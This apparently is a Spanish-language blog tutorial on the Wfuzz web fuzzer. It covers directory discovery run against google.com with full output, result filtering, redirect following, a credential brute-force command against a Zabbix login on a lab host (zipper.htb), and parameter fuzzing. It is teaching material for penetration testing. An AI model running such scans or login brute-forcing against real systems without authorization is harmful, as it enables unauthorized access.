&lt;p&gt;Bien, ahora que ya lo tenemos instalado, vamos a ver como se usa:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wfuzz --hc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 -u &lt;span class=&quot;s2&quot;&gt;&quot;https://google.com/FUZZ&quot;&lt;/span&gt; -w /usr/share/wordlists/wfuzz/general/common.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;En el comando de arriba lo que hice fue realizar un escaneo en la página web de google.com, especificando la URL con el parametro &lt;em&gt;-u&lt;/em&gt;, utilizando un diccionario de directorios que trae Wfuzz por defecto con &lt;em&gt;-w&lt;/em&gt;. Además con &lt;em&gt;–hc&lt;/em&gt; escondí el código 404 (Not Found) del output, porque los directorios que no existen no me sirven de nada.&lt;/p&gt;

&lt;p&gt;Esto es lo que me devolvió:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;

Target: https://google.com/FUZZ
Total requests: 951

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000000015:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;2001&quot;&lt;/span&gt;
000000019:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;2005&quot;&lt;/span&gt;
000000018:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;2004&quot;&lt;/span&gt;
000000017:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;2003&quot;&lt;/span&gt;
000000016:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;2002&quot;&lt;/span&gt;
000000029:   301        6 L      14 W       227 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;account&quot;&lt;/span&gt;
000000025:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;about&quot;&lt;/span&gt;
000000021:   301        6 L      14 W       221 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;
000000031:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;
000000066:   301        6 L      14 W       229 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;appliance&quot;&lt;/span&gt;
000000070:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;apps&quot;&lt;/span&gt;
000000113:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;blog&quot;&lt;/span&gt;
000000130:   301        6 L      14 W       228 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;business&quot;&lt;/span&gt;
000000184:   301        6 L      14 W       228 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;commerce&quot;&lt;/span&gt;
000000203:   301        6 L      14 W       227 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;contact&quot;&lt;/span&gt;
000000204:   301        6 L      14 W       228 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;contacts&quot;&lt;/span&gt;
000000220:   301        6 L      14 W       231 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;creditcards&quot;&lt;/span&gt;
000000226:   301        6 L      14 W       229 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;customers&quot;&lt;/span&gt;
000000255:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;design&quot;&lt;/span&gt;
000000262:   301        6 L      14 W       230 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;developers&quot;&lt;/span&gt;
000000279:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;docs&quot;&lt;/span&gt;
000000265:   301        6 L      14 W       227 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;devices&quot;&lt;/span&gt;
000000264:   302        9 L      18 W       216 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;device&quot;&lt;/span&gt;
000000286:   301        6 L      14 W       229 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;downloads&quot;&lt;/span&gt;
000000314:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;errors&quot;&lt;/span&gt;
000000309:   301        6 L      14 W       230 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;enterprise&quot;&lt;/span&gt;
000000342:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;files&quot;&lt;/span&gt;
000000366:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;games&quot;&lt;/span&gt;
000000370:   301        6 L      14 W       223 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;get&quot;&lt;/span&gt;
000000400:   301        6 L      14 W       228 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;homepage&quot;&lt;/span&gt;
000000399:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;home&quot;&lt;/span&gt;
000000380:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;groups&quot;&lt;/span&gt;
000000416:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;inbox&quot;&lt;/span&gt;
000000413:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;images&quot;&lt;/span&gt;
000000397:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;history&quot;&lt;/span&gt;
000000465:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;labs&quot;&lt;/span&gt;
000000460:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;keep&quot;&lt;/span&gt;
000000456:   301        6 L      14 W       222 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;js&quot;&lt;/span&gt;
000000498:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;mail&quot;&lt;/span&gt;
000000565:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;null&quot;&lt;/span&gt;
000000558:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;news&quot;&lt;/span&gt;
000000551:   301        6 L      14 W       230 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;navigation&quot;&lt;/span&gt;
000000546:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;music&quot;&lt;/span&gt;
000000576:   301        6 L      14 W       222 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;on&quot;&lt;/span&gt;
000000632:   301        6 L      14 W       227 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;preview&quot;&lt;/span&gt;
000000631:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;press&quot;&lt;/span&gt;
000000611:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;phone&quot;&lt;/span&gt;
000000605:   301        6 L      14 W       223 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;pdf&quot;&lt;/span&gt;
000000602:   301        6 L      14 W       228 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;
000000656:   301        6 L      14 W       229 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;publisher&quot;&lt;/span&gt;
000000689:   301        6 L      14 W       228 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;research&quot;&lt;/span&gt;
000000695:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;retail&quot;&lt;/span&gt;
000000714:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;script&quot;&lt;/span&gt;
000000736:   301        6 L      14 W       228 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;services&quot;&lt;/span&gt;
000000724:   301        6 L      14 W       228 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;security&quot;&lt;/span&gt;
000000710:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;saved&quot;&lt;/span&gt;
000000717:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;search&quot;&lt;/span&gt;
000000763:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;sites&quot;&lt;/span&gt;
000000799:   301        6 L      14 W       227 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;student&quot;&lt;/span&gt;
000000797:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;story&quot;&lt;/span&gt;
000000796:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;store&quot;&lt;/span&gt;
000000808:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;support&quot;&lt;/span&gt;
000000810:   301        6 L      14 W       226 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;survey&quot;&lt;/span&gt;
000000616:   400        9 L      14 W       145 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;ping&quot;&lt;/span&gt;
000000839:   301        6 L      14 W       227 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;toolbar&quot;&lt;/span&gt;
000000826:   301        6 L      14 W       229 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;templates&quot;&lt;/span&gt;
000000885:   301        6 L      14 W       225 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;views&quot;&lt;/span&gt;
000000913:   301        6 L      14 W       229 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;webmaster&quot;&lt;/span&gt;
000000930:   301        6 L      14 W       224 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;work&quot;&lt;/span&gt;
000000709:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;save&quot;&lt;/span&gt;
000000840:   302        9 L      18 W       211 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;tools&quot;&lt;/span&gt;

Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 3.595023
Processed Requests: 951
Filtered Requests: 880
Requests/sec.: 264.5323&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ademas de &lt;em&gt;–hc&lt;/em&gt; existen otras formas de esconder algunos resultados, porque a veces hay páginas que no nos sirven que resuelven todas el mismo resultado. Estas son:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;--hl/hw/hh: Esconde las respuestas con un determinado numero de lineas/palabras/caracteres&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Como ven arriba casi todas las respuestas que obtuvimos tienen un total de 6 lineas, por lo tanto, si escondemos este número, obtendremos menos resultados:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wfuzz --hc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 --hl&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6 -u &lt;span class=&quot;s2&quot;&gt;&quot;https://google.com/FUZZ&quot;&lt;/span&gt; -w /usr/share/wordlists/wfuzz/general/common.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;

Target: https://google.com/FUZZ
Total requests: 951

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000000264:   302        9 L      18 W       216 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;device&quot;&lt;/span&gt;                                                                                                                    
000000397:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;history&quot;&lt;/span&gt;                                                                                                                   
000000558:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;news&quot;&lt;/span&gt;                                                                                                                      
000000616:   400        9 L      14 W       145 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;ping&quot;&lt;/span&gt;                                                                                                                      
000000840:   302        9 L      18 W       211 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;tools&quot;&lt;/span&gt;                                                                                                                     
000000709:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;save&quot;&lt;/span&gt;                                                                                                                      
000000710:   302        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;saved&quot;&lt;/span&gt;                                                                                                                     

Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
Processed Requests: 951
Filtered Requests: 944
Requests/sec.: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Si miramos el código de respuesta, solo “ping” nos devuelve un número diferente a &lt;em&gt;302&lt;/em&gt;. Como sabemos que los códigos 301 y 302 son para las redirecciones, podriamos probar a seguirlas con el parámetro &lt;em&gt;-L&lt;/em&gt;, para ver en que páginas terminamos.&lt;/p&gt;

&lt;p&gt;Como este parámetro se va a ejecutar antes de esconder el número de líneas, nos mostrará todas las páginas que teniamos al principio. Asi que para obtener solo los resultados de las últimas páginas, vamos a jugar un poco con otro payload de Wfuzz.&lt;/p&gt;

&lt;p&gt;Vamos a guardar nuestro escaneo con el nombre “fuzzing” para usarlo luego:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wfuzz --hc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 --hl&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6 -u &lt;span class=&quot;s2&quot;&gt;&quot;https://google.com/FUZZ&quot;&lt;/span&gt; -w /usr/share/wordlists/wfuzz/general/common.txt --oF fuzzing&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ahora, utilizando el payload &lt;strong&gt;wfuzzp&lt;/strong&gt; vamos a seguir las redirecciones del escaneo anterior. Para consultar los payloads es tan fácil como usar el comando &lt;em&gt;“wfuzz -e payloads”&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wfuzz -z wfuzzp,fuzzing -L FUZZ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;

Target: FUZZ
Total requests: &lt;span class=&quot;sh&quot;&gt;&amp;lt;&amp;lt;unknown&amp;gt;&amp;gt;

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000264:   400        0 L      70 W       1681 Ch     &quot;https://accounts.google.com/o/oauth2/legacy/device/usercode?rt=&quot;                                                                                         
000000616:   400        9 L      14 W       145 Ch      &quot;https://google.com/ping&quot;                                                                                                   
000000709:   200        56 L     6191 W     453285 Ch   &quot;https://www.google.com/save&quot;                                                                                               
000000558:   200        1826 L   37305 W    1624121 C   &quot;https://news.google.com/topstories?hl=en-US&amp;amp;gl=US&amp;amp;ceid=US:en&quot;                                                              
                                            h                                                                                                                                       
000000840:   200        2316 L   16996 W    301468 Ch   &quot;https://www.google.com/chrome/&quot;                                                                                            
000000397:   200        519 L    4002 W     191032 Ch   &quot;https://myactivity.google.com/?continue=https://myactivity.google.com/myactivity&quot;                                          
000000710:   200        56 L     6191 W     453302 Ch   &quot;https://www.google.com/saved&quot;                                                                                              

Total time: 1.606515
Processed Requests: 7
Filtered Requests: 0
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Requests/sec.: 4.357257&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Al especificar la URL da un error, pero con solo colocar la palabra FUZZ esto se arregla. El payload se especifica con el parámetro &lt;em&gt;-z&lt;/em&gt; acompañado de la ubicación en donde se encuentra el archivo que guardamos de la sesión anterior. Hay que tener en cuenta de que las respuestas no están en el mismo orden que antes.&lt;/p&gt;

&lt;p&gt;Este payload es muy situacional, por lo tanto no es necesario indagar en él demasiado, aunque está bueno conocerlos todos porque pueden llegar a ser necesarios en algún momento. Ahora vamos a utilizar dos de ellos, los cuales en mi opinión son los más útiles.&lt;/p&gt;

&lt;h2 id=&quot;payloads&quot;&gt;Payloads&lt;/h2&gt;

&lt;p&gt;Wfuzz también es muy útil para hacer un bruteforcing simple, cuando no queremos complicarnos demasiado ni la situación lo requiere. Vamos a ver un ejemplo:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 -d &lt;span class=&quot;s2&quot;&gt;&quot;name=FUZZ&amp;amp;password=FUZ2Z&amp;amp;autologin=1&amp;amp;enter=Sign+in&quot;&lt;/span&gt; http://zipper.htb/zabbix/index.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Utilizando un payload &lt;strong&gt;file&lt;/strong&gt;, podemos llamar a un archivo con credenciales y con el parámetro &lt;em&gt;-d&lt;/em&gt; especificamos la información que mandaremos por POST. Cuando colocamos múltiples payloads el primer dato se nombra como FUZZ y luego al resto se le añade un número a partir de 2. Luego con &lt;em&gt;–sc&lt;/em&gt; solo obtendremos las respuestas con el código que hayamos ingresado, que en este caso es 200 (Ok). Tambien he añadido el parámetro &lt;em&gt;-c&lt;/em&gt;, que muestra el output con colores y queda mucho mejor.&lt;/p&gt;

&lt;p&gt;Ahora vamos a ver el otro payload:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wfuzz -c -z range,0-10 --sc 200,301 &lt;span class=&quot;s2&quot;&gt;&quot;http://zipper.htb/zabbix/index.php?id=FUZZ&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;En este payload &lt;strong&gt;range&lt;/strong&gt; utilizaremos GET, para esto solo tenemos que colocar la palabra clave &lt;strong&gt;FUZZ&lt;/strong&gt; dentro de la URL en el parámetro que corresponda y especificar el rango de números con el cual queremos hacer el fuzzing. He añadido el código de respuesta &lt;em&gt;301&lt;/em&gt; pero esto es sólo para mostrarles que se pueden añadir varios datos, no es necesario.&lt;/p&gt;

&lt;h3 id=&quot;para-terminar&quot;&gt;Para terminar…&lt;/h3&gt;

&lt;p&gt;Vamos a ver otros parámetros muy útiles, los cuales todavía no he nombrado:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;-f&lt;/em&gt;: Guardar el escaneo dentro de un archivo leíble.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;-p&lt;/em&gt;: Especificar un proxy. Esto es muy util por ejemplo cuando queremos ver las peticiones a través de Burpsuite.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;-t&lt;/em&gt;: Especificar la cantidad de threads con los cuales el escaneo se realizará. Hay que tener cuidado con este parámetro ya que un numero muy alto puede llegar a saturar el servidor.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;-R&lt;/em&gt;: Escoger un nivel de recursión. Este número será la profundidad de directorios en los cuales haremos fuzzing. Por ejemplo con un número 2 no solo hará fuzzing al directorio raíz sino tomará los casos encontrados y hará un escaneo dentro de ellos.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;-b&lt;/em&gt;: Añadir una cookie a las peticiones. Podemos colocar varias cookies repitiendo el mismo parámetro varias veces.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;-H&lt;/em&gt;: Ajustar los headers, por ejemplo el User Agent, Host, etc.&lt;/p&gt;</content><category term="fuzzing" /><category term="pentesting" /><category term="tools" /><category term="web" /><summary type="html">El fuzzing es una de las labores más importantes que un pentester debería saber, y Wfuzz pone esta tarea lo más fácil posible con una increíble herramienta que nos trae todo lo necesario para hacerlo</summary></entry></feed>
